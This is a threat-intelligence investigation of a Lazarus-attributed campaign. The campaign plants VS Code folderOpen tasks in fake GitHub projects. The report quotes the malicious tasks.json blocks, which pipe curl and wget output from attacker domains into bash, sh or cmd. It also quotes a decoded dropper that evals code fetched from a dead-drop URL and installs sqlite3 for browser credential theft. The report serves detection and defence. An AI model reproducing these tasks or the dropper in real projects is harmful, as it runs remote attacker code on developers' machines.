# Task AE: regioncheck.xyz / Vercel Cluster Investigation

## Overview

Repos using `folderOpen` tasks with curl-to-bash delivery via Vercel-hosted C2, rather than
the font-file embedded payload approach of other clusters. Abstract Security explicitly attributes
this to **Contagious Interview (Lazarus / Famous Chollima)** — their report describes it as
"a newer addition to the campaign's toolkit and a marked move away from reliance on ClickFix for
initial infection."

This is NOT a third independent actor. The Vercel/curl-to-bash delivery is a newer variant
within the same Contagious Interview campaign. Shared indicators with Task AD (jsonwebauth) cluster:
same dropper path (`/root/Programs_X64/main.js`), same auth header (`x-secret-header: secret`),
same `new Function('require', payload)(require)` execution pattern.

**All C2 infrastructure dead — Vercel blocked all domains for legal reasons.**

---

## C2 Delivery Domains

All actor-controlled domains served via Vercel CDN (`216.198.79.x`). All blocked simultaneously
by Vercel with HTTP 451 "This content has been blocked for legal reasons / DEPLOYMENT_DISABLED."

| Domain | Role | Status |
|--------|------|--------|
| `www.regioncheck.xyz` | curl-to-bash delivery (all platforms) | **Vercel 451** |
| `codeviewer-three.vercel.app` | curl-to-bash delivery (token-auth) | **Vercel 451** |
| `codeviewer-fawn.vercel.app` | curl-to-bash delivery (alternate) | **Vercel 451** |
| `vscodesettingstask.vercel.app` | curl-to-bash delivery | **Vercel 451** |
| `vscode-toolkit-bootstrap.vercel.app` | curl-to-bash delivery | **Vercel 451** |
| `www.whatisip.app` | Stage 2 dead-drop (`/api/ip-check-encrypted/`) | **Vercel 451** |
| `vscode-load.onrender.com` | Alternate delivery (Render.com) | **404** |
| `vscodeconfig.com` | Alternate delivery | **Down** |

Vercel's coordinated takedown of all these deployments simultaneously suggests a bulk abuse
report, likely from a security researcher or CERT.

---

## Victim Repositories

### `ta3pks/Decentralized-Social` — created 2026-01-15

TypeScript blockchain social app. Dual delivery: curl-to-bash primary + local JS backup.

**tasks.json:**
```json
{
  "label": "env",
  "runOptions": { "runOn": "folderOpen" },
  "osx": {
    "command": "curl 'https://www.regioncheck.xyz/settings/mac?flag=8' | bash && nohup node .vscode/spellright.dict > /dev/null 2>&1 &"
  },
  "linux": {
    "command": "wget -qO- 'https://www.regioncheck.xyz/settings/linux?flag=8' | sh"
  },
  "windows": {
    "command": "curl https://www.regioncheck.xyz/settings/windows?flag=8 | cmd && node .vscode/spellright.dict"
  }
}
```

**Local backup payload: `.vscode/spellright.dict` (3,884 bytes, obfuscator.io)**

macOS and Windows also run `node .vscode/spellright.dict` as a backup if curl fails or for
redundancy. Linux relies entirely on the curl pipeline.

### `dmbruno/card-activity` — created 2026-01-16

TypeScript DeFi staking game. Forked from `lake-2024/card-activity` (actor-controlled account,
now suspended). Fake project metadata with LLM-generated personas: "Juliette Clarke" (Lead
Engineer), "James Nodin" (CTO). Command uses 200+ spaces of padding before the actual curl:

```json
{
  "label": "vscode",
  "runOptions": { "runOn": "folderOpen" },
  "osx": { "command": "curl 'https://codeviewer-three.vercel.app/task/mac?token=6df937fe9011' | sh" },
  "linux": { "command": "wget -qO- 'https://codeviewer-three.vercel.app/task/linux?token=6df937fe9011' | sh" },
  "windows": { "command": "curl https://codeviewer-three.vercel.app/task/windows?token=6df937fe9011 | cmd" }
}
```

Token `6df937fe9011` likely uniquely identifies this "campaign" or victim batch.

**Actor account: `lake-2024`** (GitHub, created 2026-01-16 — same day as victim repo, now suspended).

---

## Local Backup Payload: `spellright.dict` (Decoded)

3.8KB obfuscator.io IIFE — fully decoded via VM instrumentation.

**Execution chain:**
```javascript
// Writes dropper to disk:
fs.writeFileSync('/root/Programs_X64/main.js', dropper_code);

// Installs deps and runs:
exec('cd "/root/Programs_X64" && bash -lc "cd \'/root/Programs_X64\' && npm init -y && npm install axios request sqlite3 && nohup node main.js > app.log 2>&1 &"');
```

**main.js content:**
```javascript
const axios = require("axios");
const url = "https://www.whatisip.app/api/ip-check-encrypted/3aeb34a38";
axios.post(url, {}, { headers: { "x-secret-header": "secret" } })
  .then((response) => { eval(response.data); });
```

**C2**: `https://www.whatisip.app/api/ip-check-encrypted/3aeb34a38`
- Method: POST (not GET)
- Auth: `x-secret-header: secret` (shared with Task AD's rentverse variant)
- Payload field: direct `eval(response.data)` — no named JSON field
- Status: **Vercel 451 (blocked)**

**npm deps installed**: `axios`, `request`, `sqlite3`
- `sqlite3` for browser credential database access (Chrome cookies, login data)

---

## Cross-Platform Delivery Pattern

Unlike PolinRider (Linux-only font-file approach) and BestCity (macOS-focused), this cluster
explicitly targets all three platforms with separate download commands:

| Platform | Mechanism |
|----------|-----------|
| macOS | `curl URL | bash` + `nohup node .vscode/spellright.dict` |
| Linux | `wget -qO- URL | sh` |
| Windows | `curl URL | cmd` + `node .vscode/spellright.dict` |

The curl pipeline delivers a bash/cmd script from the C2 server (not recoverable — domain
blocked before content could be captured). The local `spellright.dict` backup fires on Mac/Windows
whether or not the curl succeeds.

---

## Relationship to Other Clusters

| Property | regioncheck.xyz / Vercel | Task AD (jsonwebauth) | BestCity |
|----------|--------------------------|-----------------------|----------|
| Attribution | Contagious Interview | Contagious Interview | Contagious Interview |
| Dropper path | `/root/Programs_X64/main.js` | `/root/Programs_X64/main.js` | `/tmp/programx64/main.js` |
| Auth header | `x-secret-header: secret` | `x-secret-header: secret` | None |
| Dead-drop | whatisip.app (Vercel) | jsonkeeper.com / npoint.io | jsonkeeper.com |
| Obfuscation | obfuscator.io | obfuscator.io | 3-layer WJS / obfuscator.io |
| Task label | `env` / `vscode` | `eslint-check` / `Test Scripts` | `eslint-check` |
| Cross-platform | Yes (Mac/Linux/Win) | Partial | No |
| npm vector | No | Yes (`jsonwebauth`) | No |
| Actor account | `lake-2024` (suspended) | — | `BestCity-v1` (active) |

The shared dropper path and auth header between this cluster and Task AD strongly indicate these
are the same operator toolset — different campaign sub-variants, same actor.

BestCity is the most operationally distinct (different dropper path, no auth header, no
cross-platform support) — possibly a different Contagious Interview sub-team.

---

## IOCs

| Type | Value |
|------|-------|
| Domain | `regioncheck.xyz` (Vercel, blocked) |
| Domain | `codeviewer-three.vercel.app` (Vercel, blocked) |
| Domain | `codeviewer-fawn.vercel.app` (Vercel, blocked) |
| Domain | `vscodesettingstask.vercel.app` (Vercel, blocked) |
| Domain | `vscode-toolkit-bootstrap.vercel.app` (Vercel, blocked) |
| Domain | `whatisip.app` (Vercel, blocked) |
| Domain | `vscode-load.onrender.com` (dead) |
| Domain | `vscodeconfig.com` (dead) |
| Dead-drop URL | `https://www.whatisip.app/api/ip-check-encrypted/3aeb34a38` |
| Auth header | `x-secret-header: secret` |
| Dropper path | `/root/Programs_X64/main.js` |
| Payload file | `.vscode/spellright.dict` (obfuscator.io, 3.8KB) |
| Task label | `env`, `vscode` |
| Token | `6df937fe9011` (codeviewer-three campaign token) |
| Actor account | `lake-2024` (GitHub, suspended 2026-01-16+) |
| Victim repos | `ta3pks/Decentralized-Social`, `dmbruno/card-activity` |
| Vercel IPs | `216.198.79.1`, `216.198.79.65` (CDN edge — shared Vercel infrastructure) |

---

## Assessment

**Attribution**: Contagious Interview / Lazarus / Famous Chollima — confirmed by Abstract
Security. Shared toolset markers with Task AD cluster (dropper path, auth header, execution
pattern). All C2 permanently disabled.

**PolinRider relationship**: None. No TRON wallets, no BSC, no XOR cipher, no shared IPs.

**Cluster status**: **Fully dead.** All Vercel deployments blocked; actor GitHub account
(`lake-2024`) suspended; all dead-drops 404 or blocked. This sub-campaign appears to have been
completely neutralized.

**Scale**: Only 2 victim repos confirmed on GitHub (both remaining after other repos were
deleted). Abstract Security documented additional repos at time of their analysis but GitHub
code search returns 0 results for all cluster domains — all other instances deleted.
